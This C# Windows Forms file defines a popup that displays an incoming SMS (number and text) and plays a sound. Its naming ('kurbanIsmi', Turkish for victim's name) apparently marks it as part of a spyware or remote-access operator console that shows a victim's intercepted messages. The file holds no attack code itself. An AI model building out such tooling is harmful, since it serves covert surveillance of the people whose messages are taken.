using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;

namespace SV
{
    public partial class smsgeldi : Form
    {
        SoundPlayer sp;
        public smsgeldi(string numara, string icerik, string kurbanIsmi)
        {
            InitializeComponent();
            label1.Text = numara;
            richTextBox1.Text = icerik;
            Text += " =>" + kurbanIsmi;
            Screen ekran = Screen.FromPoint(Location);
            Location = new Point(ekran.WorkingArea.Right - Width, ekran.WorkingArea.Bottom - Height);
            sp = new SoundPlayer("sms.wav"); sp.Play();
        }

        private void smsgeldi_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (sp != null) { sp.Stop(); sp.Dispose(); }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Close();
        }

        private void richTextBox1_LinkClicked(object sender, LinkClickedEventArgs e)
        {
            try { System.Diagnostics.Process.Start(e.LinkText); } catch (Exception) { }
        }
    }
}
